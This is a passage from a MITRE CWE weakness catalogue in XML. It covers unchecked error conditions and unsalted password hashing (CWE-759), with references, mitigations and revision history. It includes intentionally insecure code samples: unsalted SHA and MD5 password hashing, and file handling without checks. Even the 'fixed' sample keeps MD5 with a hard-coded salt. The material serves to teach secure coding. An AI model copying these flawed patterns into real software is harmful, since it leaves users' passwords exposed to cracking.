                        <Code>int isOpen = openFileToWrite(filename);</Code>
                        <Code>if (isOpen == FAIL) {</Code>
                        <Block>
                           <Code>printf("Unable to open file %s", filename);</Code>
                           <Code>isOutput = FAIL;</Code>
                        </Block>
                        <Code>}</Code>
                        <Code>else {</Code>
                        <Block>
                           <Code>int isWrite = writeToFile(output);</Code>
                           <Code>if (isWrite == FAIL) {</Code>
                           <Block>
                              <Code>printf("Unable to write to file %s", filename);</Code>
                              <Code>isOutput = FAIL;</Code>
                           </Block>
                           <Code>}</Code>
                           <Code/>
                           <Code>int isClose = closeFile(filename);</Code>
                           <Code>if (isClose == FAIL)</Code>
                           <Block>
                              <Code>isOutput = FAIL;</Code>
                           </Block>
                        </Block>
                        <Code>}</Code>
                        <Code>return isOutput;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text> In the following Java example the method readFromFile uses a
						FileReader object to read the contents of a file. The FileReader object is
						created using the File object readFile, the readFile object is initialized
						using the setInputFile method. The setInputFile method should be called
						before calling the readFromFile method. </Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>private File readFile = null;</Code>
                     <Code/>
                     <Code>public void setInputFile(String inputFile) {</Code>
                     <Block>
                        <Comment>// create readFile File object from string containing name
									of file</Comment>
                     </Block>
                     <Code>}</Code>
                     <Code/>
                     <Code>public void readFromFile() {</Code>
                     <Block>
                        <Code>try {</Code>
                        <Block>
                           <Code>reader = new FileReader(readFile);</Code>
                           <Code/>
                           <Comment>// read input file</Comment>
                           <Code/>
                        </Block>
                        <Code>} catch (FileNotFoundException ex) {...}</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text> However, the readFromFile method does not check to see if the
							readFile object is null, i.e. has not been initialized, before creating
							the FileReader object and reading from the input file. The readFromFile
							method should verify whether the readFile object is null and output an
							error message and raise an exception if the readFile object is null, as
							in the following code. </Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>private File readFile = null;</Code>
                     <Code/>
                     <Code>public void setInputFile(String inputFile) {</Code>
                     <Block>
                        <Comment>// create readFile File object from string containing name
									of file</Comment>
                     </Block>
                     <Code>}</Code>
                     <Code/>
                     <Code>public void readFromFile() {</Code>
                     <Block>
                        <Code>try {</Code>
                        <Block>
                           <Code>if (readFile == null) {</Code>
                           <Block>
                              <Code>System.err.println("Input file has not been set, call
											setInputFile method before calling
											openInputFile");</Code>
                              <Code>throw NullPointerException;</Code>
                           </Block>
                           <Code>}</Code>
                           <Code/>
                           <Code>reader = new FileReader(readFile);</Code>
                           <Code/>
                           <Comment>// read input file</Comment>
                           <Code/>
                        </Block>
                        <Code>} catch (FileNotFoundException ex) {...}</Code>
                        <Code>catch (NullPointerException ex) {...}</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-3798</Observed_Example_Reference>
               <Observed_Example_Description>Unchecked return value leads to resultant integer
						overflow and code execution.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2006-4447</Observed_Example_Reference>
               <Observed_Example_Description>Program does not check return value when invoking
						functions to drop privileges, which could leave users with higher privileges
						than expected by forcing those functions to
						fail.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2006-2916</Observed_Example_Reference>
               <Observed_Example_Description>Program does not check return value when invoking
						functions to drop privileges, which could leave users with higher privileges
						than expected by forcing those functions to
						fail.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Reference_ID="REF-7">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 7, "Program Building Blocks" Page
						341</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-7">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 1, "Exceptional Conditions," Page
						22</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-17">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 11: Failure to Handle Errors Correctly." Page
						183</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference>
               <Reference_Author>Frank Kim</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 15 - Improper Check for Unusual or
						Exceptional Conditions</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-15</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/03/15/top-25-series-rank-15-improper-check-for-unusual-or-exceptional-conditions/</Reference_Link>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Detect and handle memory allocation errors</Mapped_Node_Name>
               <Mapped_Node_ID>MEM32-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Guarantee exception safety</Mapped_Node_Name>
               <Mapped_Node_ID>ERR39-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C Secure Coding">
               <Mapped_Node_Name>Detect and handle memory allocation errors</Mapped_Node_Name>
               <Mapped_Node_ID>MEM32-C</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submission_Date>2009-03-03</Submission_Date>
               <Submission_Comment>New entry for reorganization of
						CWE-703.</Submission_Comment>
            </Submission>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Likelihood_of_Exploit,
						Time_of_Introduction</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Background_Details, Common_Consequences,
						Demonstrative_Examples, Description, Detection_Factors, Name,
						Observed_Examples, Potential_Mitigations, References,
						Related_Attack_Patterns, Relationship_Notes,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples,
						Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors,
						Potential_Mitigations, References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-12-13</Modification_Date>
               <Modification_Comment>updated Relationship_Notes</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Description, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Common_Consequences</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Related_Attack_Patterns,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2010-02-16">Improper Check for
						Exceptional Conditions</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="759" Name="Use of a One-Way Hash without a Salt" Weakness_Abstraction="Base" Status="Incomplete">
         <Description>
            <Description_Summary>The software uses a one-way cryptographic hash against an input
					that should not be reversible, such as a password, but the software does not
					also use a salt as part of the input.</Description_Summary>
            <Extended_Description>
               <Text>This makes it easier for attackers to pre-compute the hash value using
						dictionary attack techniques such as rainbow tables.</Text>
               <Text>It should be noted that, despite common perceptions, the use of a good
						salt with a hash does not sufficiently increase the effort for an attacker
						who is targeting an individual password, or who has a large amount of
						computing resources available, such as with cloud-based services or
						specialized, inexpensive hardware. Offline password cracking can still be
						effective if the hash function is not expensive to compute; many
						cryptographic functions are designed to be efficient and can be vulnerable
						to attacks using massive computing resources, even if the hash is
						cryptographically strong. The use of a salt only slightly increases the
						computing requirements for an attacker compared to other strategies such as
						adaptive hash functions. See CWE-916 for more details.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>866</Relationship_Target_ID>
               <!--2011 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1000</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Weakness</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>916</Relationship_Target_ID>
               <!--Use of Password Hash With Insufficient Computational Effort--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">809</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>816</Relationship_Target_ID>
               <!--OWASP Top Ten 2010 Category A7 - Insecure Cryptographic Storage--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>958</Relationship_Target_ID>
               <!--SFP Secondary Cluster: Broken Cryptography--></Relationship>
         </Relationships>
         <Background_Details>
            <Background_Detail>
               <Text>In cryptography, salt refers to some random addition of data to an input
						before hashing to make dictionary attacks more difficult.</Text>
            </Background_Detail>
         </Background_Details>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Technical_Impact>Bypass protection
						mechanism</Consequence_Technical_Impact>
               <Consequence_Technical_Impact>Gain privileges / assume
						identity</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If an attacker can gain access to the hashes, then the lack of a salt
							makes it easier to conduct brute force attacks using techniques such as
							rainbow tables.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                        <Text>Binary Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Configuration Checker</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-51">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Use an adaptive hash function that can be configured to change the
							amount of computational effort needed to compute the hash, such as the
							number of iterations ("stretching") or the amount of memory required.
							Some hash functions perform salting automatically. These functions can
							significantly increase the overhead for a brute force attack compared to
							intentionally-fast functions such as MD5. For example, rainbow table
							attacks can become infeasible due to the high computing overhead.
							Finally, since computing power gets faster and cheaper over time, the
							technique can be reconfigured to increase the workload without forcing
							an entire replacement of the algorithm in use. </Text>
                  <Text>Some hash functions that have one or more of these desired properties
							include bcrypt [R.759.1], scrypt [R.759.2], and PBKDF2 [R.759.3]. While
							there is active debate about which of these is the most effective, they
							are all stronger than using salts with hash functions with very little
							computing overhead.</Text>
                  <Text>Note that using these functions can have an impact on performance, so
							they require special consideration to avoid denial-of-service attacks.
							However, their configurability provides finer control over how much CPU
							and memory is used, so it could be adjusted to suit the environment's
							needs.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>High</Mitigation_Effectiveness>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>If a technique that requires extra computational effort can not be
							implemented, then for each password that is processed, generate a new
							random salt using a strong random number generator with unpredictable
							seeds. Add the salt to the plaintext password before hashing it. When
							storing the hash, also store the salt. Do not use the same salt for
							every password.</Text>
               </Mitigation_Description>
               <Mitigation_Effectiveness>Limited</Mitigation_Effectiveness>
               <Mitigation_Effectiveness_Notes>
                  <Text>Be aware that salts will not reduce the workload of a targeted attack
							against an individual hash (such as the password for a critical person),
							and in general they are less effective than other hashing techniques
							such as increasing the computation time or memory overhead. Without a
							built-in workload, modern attacks can compute large numbers of hashes,
							or even exhaust the entire space of all possible passwords, within a
							very short amount of time, using massively-parallel computing and GPU,
							ASIC, or FPGA hardware.</Text>
               </Mitigation_Effectiveness_Notes>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-25">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>When using industry-approved techniques, use them correctly. Don't cut
							corners by skipping resource-intensive steps (CWE-325). These steps are
							often essential for preventing common attacks.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example Demonstrative_Example_ID="DX-101">
               <Intro_Text>In both of these examples, a user is logged in if their given
						password matches a stored password:</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code>unsigned char *check_passwd(char *plaintext) {</Code>
                     <Block>
                        <Code>ctext = simple_digest("sha1",plaintext,strlen(plaintext), ...
									);</Code>
                        <Comment>//Login if hash matches stored hash</Comment>
                        <Code>if (equal(ctext, secret_password())) {</Code>
                        <Block>
                           <Code>login_user();</Code>
                        </Block>
                        <Code>}</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>String plainText = new String(plainTextIn);</Code>
                     <Code> MessageDigest encer = MessageDigest.getInstance("SHA");</Code>
                     <Code> encer.update(plainTextIn);</Code>
                     <Code>byte[] digest = password.digest();</Code>
                     <Comment>//Login if hash matches stored hash</Comment>
                     <Code>if (equal(digest,secret_password())) {</Code>
                     <Block>
                        <Code>login_user();</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text>This code does not provide a salt to the hashing function, thus
							increasing the chances of an attacker being able to reverse the hash and
							discover the original password. Note this code also exhibits CWE-328
							(Reversible One-Way Hash).</Text>
               </Example_Body>
            </Demonstrative_Example>
            <Demonstrative_Example>
               <Intro_Text>In this example, a new user provides a new username and password to
						create an account. The program hashes the new user's password then stores it
						in a database.</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Python</Code_Example_Language>
                     <Code>def storePassword(userName,Password):</Code>
                     <Block>
                        <Code>hasher = hashlib.new('md5')</Code>
                        <Code>hasher.update(Password)</Code>
                        <Code>hashedPassword = hasher.digest()</Code>
                        <Comment># UpdateUserLogin returns True on success, False
									otherwise</Comment>
                        <Code>return updateUserLogin(userName,hashedPassword)</Code>
                     </Block>
                  </Block>
                  <Text>While it is good to avoid storing a cleartext password, the program
							does not provide a salt to the hashing function, thus increasing the
							chances of an attacker being able to reverse the hash and discover the
							original password if the database is compromised.</Text>
                  <Text>Fixing this is as simple as providing a salt to the hashing function
							on initialization:</Text>
                  <Block Block_Nature="Good_Code">
                     <Code_Example_Language>Python</Code_Example_Language>
                     <Code>def storePassword(userName,Password):</Code>
                     <Block>
                        <Code>hasher = hashlib.new('md5',b'SaltGoesHere')</Code>
                        <Code>hasher.update(Password)</Code>
                        <Code>hashedPassword = hasher.digest()</Code>
                        <Comment># UpdateUserLogin returns True on success, False
									otherwise</Comment>
                        <Code>return updateUserLogin(userName,hashedPassword)</Code>
                     </Block>
                  </Block>
                  <Text>Note that regardless of the usage of a salt, the md5 hash is no longer
							considered secure, so this example still exhibits CWE-327.</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-1526</Observed_Example_Reference>
               <Observed_Example_Description>Router does not use a salt with a hash, making it
						easier to crack passwords.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2006-1058</Observed_Example_Reference>
               <Observed_Example_Description>Router does not use a salt with a hash, making it
						easier to crack passwords.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Reference_ID="REF-45" Local_Reference_ID="R.759.1">
               <Reference_Author>Johnny Shelley</Reference_Author>
               <Reference_Title>bcrypt</Reference_Title>
               <Reference_Link>http://bcrypt.sourceforge.net/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-39" Local_Reference_ID="R.759.2">
               <Reference_Author>Colin Percival</Reference_Author>
               <Reference_Title>Tarsnap - The scrypt key derivation function and encryption
						utility</Reference_Title>
               <Reference_Link>http://www.tarsnap.com/scrypt.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-40" Local_Reference_ID="R.759.3">
               <Reference_Author>B. Kaliski</Reference_Author>
               <Reference_Title>RFC2898 - PKCS #5: Password-Based Cryptography Specification
						Version 2.0</Reference_Title>
               <Reference_Section>5.2 PBKDF2</Reference_Section>
               <Reference_PubDate>2000</Reference_PubDate>
               <Reference_Link>http://tools.ietf.org/html/rfc2898</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-38">
               <Reference_Author>Coda Hale</Reference_Author>
               <Reference_Title>How To Safely Store A Password</Reference_Title>
               <Reference_Date>2010-01-31</Reference_Date>
               <Reference_Link>http://codahale.com/how-to-safely-store-a-password/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-41">
               <Reference_Author>Brian Krebs</Reference_Author>
               <Reference_Title>How Companies Can Beef Up Password Security (interview with
						Thomas H. Ptacek)</Reference_Title>
               <Reference_Date>2012-06-11</Reference_Date>
               <Reference_Link>http://krebsonsecurity.com/2012/06/how-companies-can-beef-up-password-security/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-42">
               <Reference_Author>Solar Designer</Reference_Author>
               <Reference_Title>Password security: past, present, future</Reference_Title>
               <Reference_PubDate>2012</Reference_PubDate>
               <Reference_Link>http://www.openwall.com/presentations/PHDays2012-Password-Security/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-43">
               <Reference_Author>Troy Hunt</Reference_Author>
               <Reference_Title>Our password hashing has no clothes</Reference_Title>
               <Reference_Date>2012-06-26</Reference_Date>
               <Reference_Link>http://www.troyhunt.com/2012/06/our-password-hashing-has-no-clothes.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-44">
               <Reference_Author>Joshbw</Reference_Author>
               <Reference_Title>Should we really use bcrypt/scrypt?</Reference_Title>
               <Reference_Date>2012-06-08</Reference_Date>
               <Reference_Link>http://www.analyticalengine.net/2012/06/should-we-really-use-bcryptscrypt/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-46">
               <Reference_Author>OWASP</Reference_Author>
               <Reference_Title>Password Storage Cheat Sheet</Reference_Title>
               <Reference_Link>https://www.owasp.org/index.php/Password_Storage_Cheat_Sheet</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-47">
               <Reference_Author>Thomas Ptacek</Reference_Author>
               <Reference_Title>Enough With The Rainbow Tables: What You Need To Know About
						Secure Password Schemes</Reference_Title>
               <Reference_Date>2007-09-10</Reference_Date>
               <Reference_Link>http://www.securityfocus.com/blogs/262</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-48">
               <Reference_Author>Robert Graham</Reference_Author>
               <Reference_Title>The Importance of Being Canonical</Reference_Title>
               <Reference_Date>2009-02-02</Reference_Date>
               <Reference_Link>http://erratasec.blogspot.com/2009/02/importance-of-being-canonical.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-49">
               <Reference_Author>James McGlinn</Reference_Author>
               <Reference_Title>Password Hashing</Reference_Title>
               <Reference_Link>http://phpsec.org/articles/2005/password-hashing.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-50">
               <Reference_Author>Jeff Atwood</Reference_Author>
               <Reference_Title>Rainbow Hash Cracking</Reference_Title>
               <Reference_Date>2007-09-08</Reference_Date>
               <Reference_Link>http://www.codinghorror.com/blog/archives/000949.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-51">
               <Reference_Author>Jeff Atwood</Reference_Author>
               <Reference_Title>Speed Hashing</Reference_Title>
               <Reference_Date>2012-04-06</Reference_Date>
               <Reference_Link>http://www.codinghorror.com/blog/2012/04/speed-hashing.html</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-52">
               <Reference_Title>Rainbow table</Reference_Title>
               <Reference_Publisher>Wikipedia</Reference_Publisher>
               <Reference_Date>2009-03-03</Reference_Date>
               <Reference_Link>http://en.wikipedia.org/wiki/Rainbow_table</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.759.6">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 9, "Creating a Salted Hash" Page
						302</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.759.7">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 2, "Salt Values", Page 46.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
         </References>
         <Content_History>
            <Submission Submission_Source="Internal_CWE_Team">
               <Submission_Date>2009-03-03</Submission_Date>
            </Submission>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Observed_Examples</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
